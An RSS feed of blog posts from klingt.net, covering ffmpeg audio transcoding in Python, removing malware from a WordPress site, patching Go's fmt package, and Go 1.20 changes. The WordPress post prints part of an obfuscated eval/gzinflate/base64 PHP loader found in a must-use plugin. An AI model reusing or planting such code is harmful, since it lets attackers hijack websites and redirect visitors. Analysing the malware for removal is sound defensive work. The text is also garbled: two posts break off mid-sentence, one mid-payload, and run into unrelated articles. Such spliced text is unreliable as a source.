  <title>Concurrently transcode audio files to MP3 using ffmpeg and Python</title>

  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>

  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
  
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github.min.css'
    media="screen and (prefers-color-scheme: light)" />
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github-dark.min.css'
    media="screen and (prefers-color-scheme: dark)" />
  <script src='https://klingt.net/assets/highlightjs/highlight.min.js'></script>
  <script defer>
    hljs.highlightAll();
  </script>
  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
</head>

<body>
  <div class="wrapper">
    <div class="main">
      <main>
        
<h1>Concurrently transcode audio files to MP3 using ffmpeg and Python</h1>
<p>With the start of this year my Spotify subscription has ended and I'm now using Apple Music, mainly because it's part of my <a href="https://www.apple.com/de/apple-one/">Apple One</a> subscription, which not only makes it a lot cheaper than Spotify, Apple Music also allows me to hear my local music everywhere if it's on iCloud. However, that's where the advantages end, since Apple Music really sucks from a software quality standpoint. On iOS it's acceptable, but on macOS there were numerous crashes, it's kind of slow, and adding a single album to a playlist often ends in the album being added like a hundred times. Is there no QA for Apple desktop software anymore? I digress.</p>
<p>One limitation of Apple Music is, that it only supports a handful of audio file formats, i.e. there's no support for FLAC, OGG, OPUS and all the other good stuff. Some weeks ago I took NPR's <a href="https://www.npr.org/sections/therecord/2015/06/02/411473508/how-well-can-you-hear-audio-quality">audio quality test</a>, and found that I couldn't distinguish between losless and 128kbps MP3 in most cases. In the early days of MP3 this was easy, especially for acoustic music. I remember that hi-hats for example sounded &quot;watery&quot;, due to the bad codecs back then. However, those days are over, and modern MP3 codecs have gotten a lot better. So I decided to &quot;bite in the sour apple&quot; (that's not an English phrase, is it?) and convert my local library to MP3 so I can listen to it on the go in Apple Music.</p>
<p>I'm not a fan of bash scripts, at least not when they're longer than 5 lines. The natural choice, for me, is to use Python for such a scripting task. Below are the contents of <code>convert.py</code>, the script I wrote to convert the files concurrently.</p>
<pre><code class="language-python">#!/usr/bin/env python3

import concurrent
from concurrent.futures import ThreadPoolExecutor
import os
from pathlib import Path
import subprocess
import sys
from typing import List

source_dir = Path(sys.argv[1])
dest_dir = Path(sys.argv[2])
known_extensions = set([&quot;.m4a&quot;, &quot;.flac&quot;, &quot;.ogg&quot;])
source_files = []
for dirpath, _, filenames in os.walk(source_dir):
    for filename in filenames:
        p = Path(dirpath).relative_to(source_dir).joinpath(filename)
        if p.suffix in known_extensions:
            source_files.append(p)

# ...
</code></pre>
<p>In this first step we're collecting the file paths of all audio files having a <code>known_extensions</code> relative to the source directory. It's important that we have the relative path, because this will simplify the path handling of the destination path.</p>
<pre><code class="language-python">args_list = []
for source_file in source_files:
    source = source_dir.joinpath(source_file)
    dest = dest_dir.joinpath(source_file).with_suffix(&quot;.mp3&quot;)
    try:
        os.makedirs(dest.parent)
    except FileExistsError:
        print(f&quot;{dest.parent} already exists...&quot;)
    # https://trac.ffmpeg.org/wiki/Encode/MP3
    args_list.append(
        [
            &quot;ffmpeg&quot;,
            &quot;-i&quot;,
            str(source),
            &quot;-c:a&quot;,
            &quot;libmp3lame&quot;,
            &quot;-qscale:a&quot;,
            &quot;2&quot;,  # Use high quality encoding, 4 is default
            &quot;-abr&quot;,
            &quot;1&quot;,  # Enable average bitrate
            str(dest),
        ]
    )

# ...
</code></pre>
<p>In this section we build a list of arguments that we want to pass to the task function we use to schedule the work onto a thread pool. The speedup is almost linear, since <code>ffmpeg</code> will only use a single CPU core to transcode a file, hence this workload scales well with the number of available CPU cores. I decided to use average bit-rate (ABR), and the resulting files vary around 180kbps +/- 20kbps.
In a blind-test I could never tell that ose short reviews was much fun and is something I should do more regularly, even though in smaller batches and not for almost 30 albums at a time.  Also, note that the albums were added in no particular order or relevance.  There were tons of other records I could have added but they did not fit because they either weren't released in 2021 nor reissued.</p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p>I think that's the last video game I played for hours non-stop.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2">
<p>Better known as Balearic. (Sorry, that was an insider joke.)&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:3">
<p>When did planet-mu stop releasing good music?  Everything they put out in recent years is embarrassing garbage that is just a bit to edgy to be released on Stones Throw.&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:4">
<p>You should follow this label, they have a very solid track record of album releases.&#160;<a href="#fnref:4" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:5">
<p>A foolish thought, there is always some great album left to discover.&#160;<a href="#fnref:5" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>


      </main>
    </div>
  </div>
</body>

</html>
]]></content:encoded>
      <author>Andreas Linz</author>
      <pubDate>Sat, 17 Feb 2024 13:34:37 +0000</pubDate>
    </item>
    <item>
      <title>How I Detected and Removed Malware from a Wordpress Installation</title>
      <link>https://klingt.net/articles/how-i-detected-and-removed-malware-from-a-wordpress-installation.html</link>
      <description>Wordpress is the major target for malware, mainly because it&#39;s so widespread, often unmaintained, and plugins add additional loopholes to the already fragile CMS.  Even with auto updates enabled, your Wordpress instance will not be safe from getting infected with malware.  In this article I will describe how I removed a malware from an up-to-date wordpress instance and describe what I found there.</description>
      <content:encoded><![CDATA[<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <meta name="description" content="Wordpress is the major target for malware, mainly because it&#39;s so widespread, often unmaintained, and plugins add additional loopholes to the already fragile CMS.  Even with auto updates enabled, your Wordpress instance will not be safe from getting infected with malware.  In this article I will describe how I removed a malware from an up-to-date wordpress instance and describe what I found there.">
  
  <title>How I Detected and Removed Malware from a Wordpress Installation</title>

  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>

  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
  
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github.min.css'
    media="screen and (prefers-color-scheme: light)" />
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github-dark.min.css'
    media="screen and (prefers-color-scheme: dark)" />
  <script src='https://klingt.net/assets/highlightjs/highlight.min.js'></script>
  <script defer>
    hljs.highlightAll();
  </script>
  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
</head>

<body>
  <div class="wrapper">
    <div class="main">
      <main>
        
<h1>How I Detected and Removed Malware from a Wordpress Installation</h1>
<p>This week a friend of mine reached out to me, telling me their website got &quot;hacked&quot;, and asking if I could have a look and see if I can fix it.  Of course they didn't got hacked, instead their Wordpress installation caught a malware.  The only indication I got was that those redirects started about three weeks ago.</p>
<h2>Reproduce the Issue</h2>
<p>First step was visiting their website with developer tools open, trying to reproduce the issue.  It didn't took me long to get redirected, I think the second link I clicked resulted in the scammer website being loaded.</p>
<p><img src="scammer-website-family-drugs-net.png" alt="screenshot showing the scammer website family-drugs.net"></p>
<p>Not a surprise that <code>family-drugs.net</code> accepts Bitcoin, fraud is the only use case of cryptocurrencies<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>.  The network tab wasn't showing any suspicious requests so I copied the request as cURL statement that resulted in the redirect.  Then I ran the cURL request and, voila, the server responded with a 302 redirect.  This let me rule out malicious Javascript as the culprit, since cURL is not evaluating it.  To get a minimal example I started removing header arguments from the cURL statement until I ended up with:</p>
<pre><code class="language-sh">$ curl -I -H 'referer: infected-website.de' https://infected-website.de/page` 
HTTP/1.1 302 Found
Date: Sun, 03 Apr 2022 16:37:56 GMT
Server: Apache/2.4.53 (Debian)
X-Powered-By: PHP/7.4.28
Set-Cookie: sl_message=admin; expires=Thu, 01-Jan-2032 00:00:00 GMT; Max-Age=307524123; path=/
Location: https://family-drugs.net/
Content-Type: text/html; charset=UTF-8
</code></pre>
<p>Actually, it didn't matter which value the <code>referer</code> header had, it only had to be present.   Also, they set a cookie for whatever reason.</p>
<h2>Run the Wordpress Website Locally</h2>
<p>We're left with only three candidates that can contain the malware, Apache, Wordpress or its database.  Apache being the most unlikely of the three because the website was hosted on a professional hosting service and then a bunch of customers would have been affected as well.  Anyhow, this could easily be disqualified by running the Wordpress installation locally.  Docker compose is the obvious choice for this setup.</p>
<p>Before I could start with the docker-compose setup I needed to get a copy of the website files and a dump of their MySQL database.  A database dump could be downloaded from the admin panel of the webhoster, it was 42373 lines of SQL and 13MiB in size.  Getting a copy of the file tree was also easy since I had SSH access.</p>
<p>At first I tried to clone the website by using FTP, and there's a reason nobody is using this protocol anymore.  Somehow random files ended up missing in my local copy and thus Wordpress was not starting, only showing some generic error message and no log message at all 😩.  It took me more than an hour until I realized that something was missing.</p>
<p>My rescue was <code>rsync --archive infected-website.de: ./infected-website</code>, resulting in a whopping 18210 files consuming 1.3GiB of disk space 🙈.</p>
<p>Here's the <code>docker-compose.yml</code> I came up with:</p>
<pre><code class="language-yaml">version: &quot;3.9&quot;
    
services:
  db:
    # Note that there's no arm64v8 (Apple Silicon) image for mysql:5.7,
    # but for mysql/mysql-server:5.7 there is one¯\_(ツ)_/¯
    image: mysql/mysql-server:5.7
    restart: always
    volumes:
    # Import database dump.
      - ./infected-website.sql:/docker-entrypoint-initdb.d/dump.sql:ro
    environment:
    # Use the credentials that are defined in wp-config.php.
      MYSQL_DATABASE: infected-website
      MYSQL_USER: admin
      MYSQL_PASSWORD: this-is-a-secret
  wordpress:
    depends_on:
      - db
    image: wordpress:5.9.2
    volumes:
      - ./cloned-website/html:/var/www/html:ro
    ports:
      - &quot;80:80&quot;
    restart: always
</code></pre>
<p>In this setup MySQL is not exposed on <code>localhost:3306</code>, instead it can be accessed from the wordpress container through the <code>db</code> hostname.  This means I needed to apply the following patch to <code>wp-config.php</code>:</p>
<pre><code class="language-diff">-define('DB_HOST', 'localhost');
+define('DB_HOST', 'db');
</code></pre>
<p>Running the website locally was only a <code>docker-compose up</code> away.  After opening <code>localhost</code> in my browser I got redirected to <code>infected-website.de</code>.  Looks like I need to replace the domain with <code>localhost</code> in the SQL dump.  A perfect task for good ol' <code>sed</code>:</p>
<pre><code class="language-sh">$ sed -Ei '' 's/(http:|https:)?\/\/(www\.)?infected-website\.de/http:\/\/localhost/g' usr_web629_1.sq
</code></pre>
<p>Please note that I'm using macOS' <code>sed</code> here, but the same command should work on Linux machines if you remove the empty quotes that follow the <code>-Ei</code> flag.</p>
<p>Now I'm ready to run the site locally.</p>
<h3>Investigation</h3>
<p>I did the obvious at first and searched for occurrences of <code>family-drugs.net</code> in the website source files and the database dump.  That wasn't very fruitful so I tried different encodings of the search string, e.g. base64, hex encoded, unicode escaped and so on<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup>.  Looking for the substring <code>drugs</code> in a variety of encodings did not help either, no hit in the search results.</p>
<p>Next thing I tried was to deactivate all the plugins through Wordpress' dashboard.  After deactivating them I ran the cURL request again, but this time against <code>localhost</code> and got a redirect 😕.</p>
<pre><code class="language-sh">$ curl -I -H 'referer: does-not-matter' localhost/page
HTTP/1.1 302 Found
Date: Sat, 09 Apr 2022 12:28:36 GMT
Server: Apache/2.4.53 (Debian)
X-Powered-By: PHP/7.4.28
Set-Cookie: sl_message=admin; expires=Thu, 01-Jan-2032 00:00:00 GMT; Max-Age=307020684; path=/
Location: https://family-drugs.net/
Content-Type: text/html; charset=UTF-8
</code></pre>
<p>I continued with browsing through the SQL dump, looking for suspicious content, and I was shocked to see how much serialized PHP there is in a usual Wordpress database.  However, none of this was malicious, just plugin data.  I did the same for the <code>.php</code> files but there were just too many of them and I couldn't find anything malicious in there as well.  In hindsight I should have searched for high-entropy strings with a tool like <a href="https://github.com/trufflesecurity/truffleHog">truffleHog</a>.</p>
<p>I was running out of ideas, and so I decided to remove things until the redirect didn't occur anymore.  In the database I began deleting tables, each time checking for the redirect.  Eventually, I ended up with a mostly empty database where I also deleted most of <code>wp_options</code> but the redirect still happened.  We can rule out the database now, that's for sure.</p>
<p>The next thing I did was to download a new Wordpress archive and replace the existing files with it.  As you can already imagine, it didn't fix the issue, but this also meant that Wordpress itself was not the culprit.</p>
<p>What we're left with are the plugins, which was surprising to me since I deactivated them already and still saw the redirect happening.  Let's take the sledgehammer and crush down all the plugins, or deleting them one-by-one to say it in a more cultivated manner.  It was the last plugin I looked at, of course, that contained the malware.</p>
<h3>The Malware</h3>
<p>Below are the contents of <code>/wp-content/mu-plugins/index.php</code>, making no secret of their malicious nature.</p>
<pre><code class="language-php">&lt;?php 

/**
 * arbitrary bother focus glorious household invade pursue triangle vertical.
 * acid bundle conservation guilty recreation simplify vacuum.
 * alcohol attitude comedy decline defect delay delicate enviroment exclaim explosive geography harmony junior manufacture navigation neglect recreation remote ridge ridid simplify volcano.
 * adequate aware debate estimate excursion herd illusion jewel nylon passion route ruin shrug sophisticated submerge vain vivid.
 * applause isolate nuclear optimistic transmit virus.
 * @package WordPress
 */

eval (gzinflate(base64_decode(
'xRnbbttG9jkB8g+0oAUpVLJsZ3fbxnVcRaYTt75VF7eFYRBjcmxNRXLYmZEsOwiw'
.'uw/7RwssCux+g/NHPWdISiRFSknQiyAfcW7nfht6/+VX+9EoevaUCsGFI2jEhWLh'
.'rbXV2H329GsWMkdSZZkjFfiO3iPNprll5lc9JiOf3K/fIBURahJVb/T5bXHx2dOb'
.'SegqxkPD5XzMqNV49vQtzhvwqQeAdiJ8Y88AJlUkX7Tb1yBA65qrTZcHbUG9TTVT'
.'5m6y3x3BVhdOOEBUWfPzjWSDXgJeeASL7qhpdIe947PzgdOzB8Pe6aDXOe0f2r2m'
.'ocSErj3U7x87F3bv6PDHcxsP3RBfrj/1xu4cLO2uow1S3umMungmh8r1uaTZ2XpI'
.'7xLlxMd352q73xnDbDBWLKDWVtOIv9v6u7P1fCdFwW4MiwaRurfqTvfs7Nsj+9KU'
.'vhNQKcktNa8aDeNtvBM/IExio+ympmESL2AhPCBdGLbNFD9+RpR4VFjmMXcJ2vmF'
.'YRqbc+Ybu4YHCGtOLT3zzqCglyzdUi6r2Syy+hG8fgq/mudU8/Cgn12fSGmAdzKwith either <code>_</code> or <code>.</code>.</p>
<pre><code class="language-sh">$ git clone --depth 1 --branch go1.21.6 git@github.com:golang/go _go
</code></pre>
<p>Now we need to build the <code>go</code> tool from the cloned source:</p>
<pre><code class="language-sh">pushd _go/src/go &amp;&amp; ./make.bash; popd
</code></pre>
<p>If you forget to do this you'll see an error like</p>
<pre><code class="language-sh">go: no such tool &quot;compile&quot;
</code></pre>
<p>when trying to compile against your modified Go version.
A slight environment modifications is necessary so that the custom <code>go</code> build is picked up:</p>
<pre><code class="language-sh">export GOROOT=$PWD/_go
export PATH=$GOROOT/bin:$PATH
</code></pre>
<p>With this done let's modify <code>$GOROOT/src/fmt/print.go</code> as shown in this diff:</p>
<pre><code class="language-diff">diff --git a/src/fmt/print.go b/src/fmt/print.go
index 9c3bd3e..3a83a99 100644
--- a/src/fmt/print.go
+++ b/src/fmt/print.go
@@ -301,6 +301,7 @@ func Append(b []byte, a ...any) []byte {
 // It returns the number of bytes written and any write error encountered.
 func Fprintln(w io.Writer, a ...any) (n int, err error) {
 	p := newPrinter()
+	p.doPrint([]any{&quot;Hello,&quot;})
 	p.doPrintln(a)
 	n, err = w.Write(p.buf)
 	p.free()
</code></pre>
<p>Another run of <code>go run hello.go</code> will now print <code>Hello,World!</code>.
Success 🎉!</p>


      </main>
    </div>
  </div>
</body>

</html>
]]></content:encoded>
      <author>Andreas Linz</author>
      <pubDate>Sat, 17 Feb 2024 13:34:37 +0000</pubDate>
    </item>
    <item>
      <title>Go 1.20, what&#39;s new</title>
      <link>https://klingt.net/articles/go-1-20-what-s-new.html</link>
      <description>An overview over the changes with Go 1.20 that are most interesting for me, and hopefully for you too</description>
      <content:encoded><![CDATA[<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <meta name="description" content="An overview over the changes with Go 1.20 that are most interesting for me, and hopefully for you too">
  
  <title>Go 1.20, what&#39;s new</title>

  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>

  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
  
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github.min.css'
    media="screen and (prefers-color-scheme: light)" />
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github-dark.min.css'
    media="screen and (prefers-color-scheme: dark)" />
  <script src='https://klingt.net/assets/highlightjs/highlight.min.js'></script>
  <script defer>
    hljs.highlightAll();
  </script>
  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
</head>

<body>
  <div class="wrapper">
    <div class="main">
      <main>
        
<ul>
<li>Most information was taken from the <a href="https://go.dev/doc/go1.20">release notes</a>.</li>
<li><del>Release is schedules for February 2023.  Releases happened between <a href="https://go.dev/doc/devel/release">16th and 25th in the past</a>, so I assume that 1.20 will be released end of February as well.</del> Final release was on 1st of February 2023, a little bit earlier than usual for an even version number Go release.</li>
<li>I talked about this in our <a href="https://golangleipzig.space/posts/meetup-34-wrapup/">#34 Leipzig Gophers Meetup</a>.</li>
</ul>
<hr>
<h2>Context</h2>
<p>Package <code>context</code> received <a href="https://go.dev/pkg/context/#WithCancelCause"><code>WithCancelCause</code></a> which allows to cancel a context with a given error.  This is pretty nice to have something more meaningful than the usual <code>context.Canceled</code> error, that won't tell you anything about why something got canceled. (<a href="https://go.dev/play/p/dp-sJNfYp-Y">playground</a>)</p>
<h2>Errors</h2>
<p>Support for <strong>wrapping multiple errors</strong>:
- <a href="https://pkg.go.dev/errors@go1.20rc3#Join"><code>errors.Join</code></a> to wrap multiple errors into one (error messages will be newline delimited)
- <code>fmt.Errorf</code> now also supports multiple <code>%w</code> format verbs
- (<a href="https://go.dev/play/p/xSsD6AF_w0p">playground</a>)</p>
<h2>HTTP Response Controller</h2>
<p><a href="https://pkg.go.dev/net/http@go1.20rc3#ResponseController"><strong><code>http.ResponseController</code></strong> </a> wraps an <code>http.ResponseWriter</code> and makes it more convenient to configure it in a Handler, e.g. no need to make checked-cast to an <code>http.Hijacker</code> anymore, just call <code>responseController.Hijack()</code>.  You can also easily overwrite <a href="https://github.com/golang/go/blob/7f59bea53c888605faaa46cd95aaa3ddf29219bf/src/net/http/responsecontroller.go#L84-L96">read</a> and <a href="https://github.com/golang/go/blob/7f59bea53c888605faaa46cd95aaa3ddf29219bf/src/net/http/responsecontroller.go#L104-L116">write deadlines</a> using the response controller.</p>
<h2>Language Changes</h2>
<p><strong>Slice to array conversions</strong> are now a bit easier to write (<a href="https://go.dev/play/p/fVXMR6m6ihu?v=gotip">playground</a>).</p>
<pre><code class="language-go">	x := []int{1, 2, 3, 4}
	var y [4]int
	// Go 1.17+
	// y = *(*[4]int)(x)
	y = [4]int(x)
</code></pre>
<p>Note that this will</p>
<ul>
<li>copy the elements from the slice to the array</li>
<li>conversion from array to slice works the same way</li>
<li>array to slice conversion will run-time panic if the target slice won't fit the array (len(slice) &lt; len(array))</li>
</ul>
<p>Three new functions for <strong>unsafe modification fo slices</strong>, <a href="https://tip.golang.org/ref/spec/#Package_unsafe"><code>SliceData</code>, <code>String</code>, <code>StringData</code></a>.  Don't use it, except you know what you're doing.</p>
<p>The <strong>language specification</strong> now defines that</p>
<ul>
<li>struct values are compared one field at a time, in the order fields were declared in the struct definition</li>
<li><a href="https://go.dev/play/p/ovlSPbbcIrY">array values are compared one element at a time</a>, in increasing index order
<ul>
<li>Note that slices still cannot be checked for equality using the <code>==</code> operator!</li>
</ul>
</li>
<li>comparisons stop at the first mismatch
This will have no effect on existing programs, just a clear description in the spec what was already implemented</li>
</ul>
<p>The <strong><code>comparable</code> constraint</strong> is now satisfied by <a href="https://tip.golang.org/ref/spec#Comparison_operators">comparable types</a>, sound obvious, right 😅?  In practice this means that a <code>comparable</code> constrained type parameter can be instantiated with non-strictly comparable types, like <code>interface</code>s.  As an example, you can do the following from Go 1.20 (<a href="https://go.dev/play/p/lVBUwYionqs?v=gotip">playground</a>):</p>
<pre><code class="language-go">func f[K comparable, V any](keys []K, values []V) map[K]V {
	m := make(map[K]V, len(keys))
	for idx, key := range keys {
		m[key] = values[idx]
	}
	return m
}
</code></pre>
<h2>Tools</h2>
<ul>
<li><strong>Go distribution will become a bit smaller</strong> because pre-compiled packages from the standard library are removed.  Instead, packages of the standard library will be compiled on the fly and then stored in the build cache (like any other package).</li>
<li><code>go test -json</code> will <strong>emit a start <code>Action</code></strong> at the beginning of each test execution.</li>
<li>The <code>go</code> command received a <code>-C</code> flag, to <strong>change working directory</strong>.</li>
<li>Build related commands, <code>go build</code> and <code>go install</code>, received a <code>-cover</code> flag to <strong>build with code coverage instrumentation</strong>.
<em>There will be a separate talk today, that is going to cover this topic in detail.</em></li>
<li><strong><code>net</code> and <code>os/user</code> packages are now pure Go packages under macOS</strong>, i.e. they don't require <code>cgo</code> anymore.</li>
<li><strong><code>cgo</code> is not required anymore for the race-detector under macOS</strong> (you can run those tests now without having XCode installed)</li>
</ul>
<h2>Runtime</h2>
<ul>
<li>Experimental support for arena allocations (<a href="https://github.com/golang/go/issues/51317">language proposal</a>).  Allocations from the memory arena are not considered by the GC and the arena will be freed manually all at once. (<a href="https://docs.go101.org/std/pkg/arena.html">package docs</a>).  Should be handled with care due to easy to introduce use-after-free bugs.</li>
<li>Up to 2% less CPU usage, due to GC improvements.</li>
</ul>
<h2>Compiler</h2>
<ul>
<li>Support for <a href="https://en.wikipedia.org/wiki/Profile-guided_optimization">PGO</a>, <strong>profile guided optimization</strong>, in builds.  This means that the compiler can leverage run-time profile data to optimize the compiled code, e.g. by more aggressive inlining.  Claimed performane improvement are about 3-4%.  More PGO optimizations will be added in further releases.
<ul>
<li>Record a CPU profile and pass that to the compiler.</li>
</ul>
</li>
<li><strong>Up to 10% faster build speeds</strong>, which brings compile times down to pre-generic levels.</li>
<li>There's a Go blog post with more details: <a href="https://go.dev/blog/pgo-preview">https://go.dev/blog/pgo-preview</a></li>
</ul>
<h2>Standard Library</h2>
<ul>
<li><strong>New <code>crypto/ecdh</code> and <code>crypto/ecdsa</code> packages</strong> which replaces the more low-level <code>crypto/elliptic</code>.  Fillipo Valsorda wrote a deep-dive on the <a href="https://words.filippo.io/dispatches/go-1-20-cryptography/">Go 1.20 crypto changes</a>, e.g. the elliptic curve crypto packages don't rely on <code>math/big</code> anymore, which makes them constant time.</li>
<li><a href="https://pkg.go.dev/net/http/httputil@go1.20rc3#ReverseProxy"><strong>ReverseProxy Rewrite hook</strong></a> superceeds <code>httputil.Director</code> and now receives in- and outbound requests with its <code>*httputil.ProxyRequest</code> argument (unlike a Director function which just received an outbound request).</li>
</ul>
<h3>Minor standard library changes</h3>
<ul>
<li><code>archive/tar</code> and <code>archive/zip</code> return <a href="https://go.dev/pkg/archive/zip/#ErrInsecurePath"><code>ErrInsecurePath</code></a> if an entry has an absolute path, contains invalid characters etc.  Note that this is currently behind a feature flag, <code>GODEBUG=zipinsecurepath=0</code> but might get the default in a future release.</li>
<li>the <code>bytes</code> package received
<ul>
<li><a href="https://github.com/golang/go/blob/518889b35cb07f3e71963f2ccfc0f96ee26a51ce/src/bytes/bytes.go#L1352-L1360"><code>Clone</code></a>, which basically returns a clone of the given byte slice.  This is a useful utitlity with a pretty minimal implementation.</li>
<li><code>TrimPrefix</code> and <code>TrimSuffix</code> got siblings, called <code>CutPrefix</code> and <code>CutSuffix</code>.  The difference is that the <code>Cut</code> functions will return if something was removed or not.</li>
</ul>
</li>
<li><code>crypto/tls</code> TLS certificates are now shared across all clients using a certificate, which might lead to significantly less memory usage.  If a handshake fails a new <a href="https://go.dev/pkg/crypto/tls/#CertificateVerificationError"><code>CertificateVerificationError</code></a> is returned.</li>
<li><a href="https://pkg.go.dev/io#OffsetWriter"><code>io.OffsetWriter</code></a> basically wraps an <code>io.WriterAt</code> and adds a given fixed offset to each Seek, Write etc. call.</li>
<li>Directory trees are usually traversed using <code>fs.Walk</code>.  There's a new <code>SkipAll</code> error that can be used to immediately stop the recursion of <code>fs.Walk</code>, but this error will be consumed and the call will end successfully.  This is mostly for convenience, since you could have achieved the same before, just that the caller had to filter out the custom error that indicates the traversal stop.</li>
<li><code>math/rand</code> will <a href="https://github.com/golang/go/blob/518889b35cb07f3e71963f2ccfc0f96ee26a51ce/src/math/rand/rand.go#L323-L334">automatically seed the global RNG</a>, this can deactivated with <code>GODEBUG=randautoseed=0</code>.  I'd argue against using the global RNG and to always instantiate a local instance.  The same applies to any other global instance.</li>
<li>We got three new time formats:
<ul>
<li><code>DateTime   = &quot;2006-01-02 15:04:05&quot;</code></li>
<li><code>DateOnly   = &quot;2006-01-02&quot;</code></li>
<li><code>TimeOnly   = &quot;15:04:05&quot;</code></li>
</ul>
</li>
<li><code>testing.B</code> can now report the <a href="https://go.dev/pkg/testing/#B.Elapsed">elapsed time</a></li>
</ul>
<h3>Future</h3>
<ul>
<li>There's a <a href="https://github.com/golang/go/issues/56345">proposal</a> to add structured logging support to the standard library with package <a href="https://go.googlesource.com/proposal/+/master/design/56345-structured-logging.md"><code>log/slog</code></a></li>
<li>Can be used already by importing <a href="https://pkg.go.dev/golang.org/x/exp/slog"><code>golang.org/x/exp/slog</code></a></li>
<li>Currently
<ul>
<li>we only have package <a href="https://pkg.go.dev/log"><code>log</code></a>,  a simple logger that has no support for levels etc.</li>
<li>every logging library needs to define their own <code>Logger</code> interface</li>
</ul>
</li>
<li>At a high level <code>slog</code> is build from three parts:
<ul>
<li><a href="https://pkg.go.dev/golang.org/x/exp/slog#Logger">Logger</a> is user-facing part of the API, exposing methods like <code>.Info()</code> or <code>.Error()</code>.
<blockquote>
<p>A Logger records structured information about each call to its Log, Debug, Info, Warn, and Error methods. For each call, it creates a Record and passes it to a Handler.</p>
</blockquote>
</li>
<li><a href="https://pkg.go.dev/golang.org/x/exp/slog#Record">Record</a> contains data of a logging even.
<blockquote>
<p>A Record holds information about a log event. Copies of a Record share state. Do not modify a Record after handing out a copy to it.</p>
</blockquote>
</li>
<li><a href="https://pkg.go.dev/golang.org/x/exp/slog#Handler">Handler</a> is a logging backend implementation, that handles records emitted from a Logger.
<blockquote>
<p>A Handler handles log records produced by a Logger.
A typical handler may print log records to standard error, or write them to a file or database, or perhaps augment them with additional attributes and pass them on to another handler.</p>
</blockquote>
</li>
</ul>
</li>
<li><a href="https://go.dev/play/p/FewCi4X-JSu">playground</a>, copied from this article: <a href="https://mrkaran.dev/posts/structured-logging-in-go-with-slog/">https://mrkaran.dev/posts/structured-logging-in-go-with-slog/</a></li>
</ul>
<hr>


      </main>
    </div>
  </div>
</body>

</html>
]]></content:encoded>
      <author>Andreas Linz</author>
      <pubDate>Sat, 17 Feb 2024 13:34:37 +0000</pubDate>
    </item>
  </channel>
</rss>